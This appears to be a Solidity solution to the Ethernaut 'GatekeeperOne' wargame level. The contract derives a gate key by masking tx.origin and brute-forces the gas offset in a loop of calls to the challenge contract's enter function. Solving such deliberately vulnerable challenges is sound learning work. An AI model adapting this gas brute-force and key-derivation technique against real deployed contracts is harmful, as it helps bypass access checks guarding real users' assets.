// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel13.sol";

contract LetMeThrough {

    GatekeeperOne level13 = GatekeeperOne(0xfc0eC7C8725FB8d14532F9AE8BCec72d549EA1d5);

    function exploit() external{
        bytes8 _gateKey = bytes8((bytes20(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 499; i++) {
            (bool success, ) = address(level13).call{gas: i + 1638201}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}

